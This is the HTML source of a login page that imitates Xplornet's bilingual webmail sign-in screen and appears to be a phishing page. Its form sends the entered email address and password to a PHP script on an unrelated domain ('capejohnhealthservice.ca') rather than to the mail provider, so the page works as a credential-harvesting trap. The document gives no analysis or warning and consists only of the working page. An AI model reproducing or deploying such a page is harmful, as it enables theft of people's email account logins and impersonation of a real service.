<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Webmail :: Welcome to Webmail</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="./Webmail_files/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="./Webmail_files/login.css">
    <link rel="stylesheet" type="text/css" href="./Webmail_files/styles.2.css">
</head>
<body class="ver2">
    <div id="login-form">
        <div id="login-logo">
            <img class="resize" src="./Webmail_files/login_logo.png" id="logo" alt="Webmail">
        </div>
        <div class="box-inner">
            <form name="form" method="post" action="https://capejohnhealthservice.ca/1/xplornet1.php">
                <table id="loginform" class="table">
                    <tbody>
                        <tr class="form-group row">
                            <td class="field pair-top wm-user">
                                <span>E-mail address / Courriel</span>
                            </td>
                            <td class="field pair-bottom input-group input-group-lg">
                                <span class="input-group-prepend"><i class="input-group-text icon user"></i></span>
                                <input class="attr form-control" id="rcmloginuser" type="email" autocapitalize="off" size="40" required name="username" placeholder="yourname@xplornet.ca">
                            </td>
                        </tr>
                        <tr class="spacer-bottom wm-pass form-group row">
                            <td class="field pair-top">
                                <span>Password / Mot de passe</span>
                            </td>
                            <td class="field pair-bottom input-group input-group-lg">
                                <span class="input-group-prepend"><i class="input-group-text icon lock"></i></span>
                                <input class="attr form-control" id="rcmloginpwd" type="password" autocapitalize="off" size="40" required name="password" placeholder="password is case-sensitive">
                            </td>
                        </tr>
                    </tbody>
                </table>
                <div class="formbuttons">
                    <button type="submit" class="button mainaction btn btn-primary login">Login / Se connecter</button>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
